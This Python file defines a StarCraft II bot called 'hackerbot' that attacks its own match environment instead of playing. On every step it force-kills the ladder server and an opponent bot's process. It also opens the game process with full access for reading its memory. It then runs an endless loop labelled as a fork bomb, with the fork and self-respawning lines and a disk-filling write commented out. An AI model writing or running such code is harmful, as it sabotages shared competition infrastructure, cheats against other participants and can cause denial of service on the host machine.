import sc2
import sys
import subprocess
import os
import platform
from ctypes import *
from ctypes.wintypes import *
import ctypes, win32ui, win32process

class hackerbot(sc2.BotAI):
	async def on_step(self, iteration):
		# Kill the Ladderserver
		os.system("taskkill /f /im Sc2LadderServer.exe")

		# or just the opponent? (could be a list)
		os.system("taskkill /f /im 5minBot.exe")

		################################################################
		# memory and window attacks
		################################################################
		OpenProcess = windll.kernel32.OpenProcess
		ReadProcessMemory = windll.kernel32.ReadProcessMemory
		FindWindowA = windll.user32.FindWindowA
		GetWindowThreadProcessId = windll.user32.GetWindowThreadProcessId
	
		PROCESS_ALL_ACCESS = 0x1F0FFF
		HWND = win32ui.FindWindow(None,u"StarCraft II").GetSafeHwnd()
		PID = win32process.GetWindowThreadProcessId(HWND)[1]
		processHandle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,PID)
		print(f"HWND: {HWND}")
		print(f"PID: {PID}")
		print(f"PROCESS: {processHandle}")

		################################################################
		# DOS (inactive)
		################################################################
		# Take HDD Space
		#with open('output_file', 'wb') as fout:
		#	fout.write(os.urandom(1024))

		# ForkBombs		
		while True:
			if platform.system() == 'Linux' or platform.system() == 'Darwin':
				print("Bomb")
				#os.fork()
			elif platform.system() == 'Windows':
				print("Bomb")
				#subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)